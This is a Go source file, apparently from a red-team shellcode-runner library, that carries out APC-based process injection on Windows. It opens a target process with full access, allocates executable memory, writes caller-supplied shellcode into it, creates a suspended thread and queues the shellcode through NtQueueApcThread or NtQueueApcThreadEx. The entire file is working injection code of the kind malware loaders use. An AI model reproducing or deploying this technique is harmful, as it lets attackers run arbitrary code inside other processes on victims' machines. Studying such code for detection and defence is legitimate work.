package runsc

import (
	"golang.org/x/sys/windows"

	"gitlab.com/mjwhitta/errors"
)

func nqatSetup(
	pid uint32,
	sc []byte,
) (windows.Handle, uintptr, error) {
	var addr uintptr
	var e error
	var pHndl windows.Handle
	var tHndl windows.Handle

	// Ensure shellcode was provided
	if len(sc) == 0 {
		return 0, 0, errors.New("no shellcode provided")
	}

	// Get process handle
	if pid == 0 {
		pHndl = windows.CurrentProcess()
	} else {
		if pHndl, e = NtOpenProcess(pid, ProcessAllAccess); e != nil {
			return 0, 0, e
		}
		defer windows.CloseHandle(pHndl)
	}

	// Allocate memory
	addr, e = NtAllocateVirtualMemory(
		pHndl,
		uint64(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if e != nil {
		return 0, 0, e
	}

	// Copy shellcode to allocated memory
	if e = NtWriteVirtualMemory(pHndl, addr, sc); e != nil {
		return 0, 0, e
	}

	// Create new thread
	if tHndl, e = RtlCreateUserThread(pHndl, 0, Suspended); e != nil {
		return 0, 0, e
	}

	return tHndl, addr, nil
}

// WithNtQueueApcThread will launch the provided shellcode
// using NtAllocateVirtualMemory, NtWriteVirtualMemory, and
// NtQueueApcThread.
func WithNtQueueApcThread(pid uint32, sc []byte) error {
	var addr uintptr
	var e error
	var tHndl windows.Handle

	if tHndl, addr, e = nqatSetup(pid, sc); e != nil {
		return e
	}

	// Run shellcode
	if e = NtQueueApcThread(tHndl, addr); e != nil {
		return e
	}

	return nil
}

// WithNtQueueApcThreadEx will launch the provided shellcode
// using NtAllocateVirtualMemory, NtWriteVirtualMemory, and
// NtQueueApcThreadEx.
func WithNtQueueApcThreadEx(pid uint32, sc []byte) error {
	var addr uintptr
	var e error
	var tHndl windows.Handle

	if tHndl, addr, e = nqatSetup(pid, sc); e != nil {
		return e
	}

	// Run shellcode
	if e = NtQueueApcThreadEx(tHndl, addr); e != nil {
		return e
	}

	return nil
}
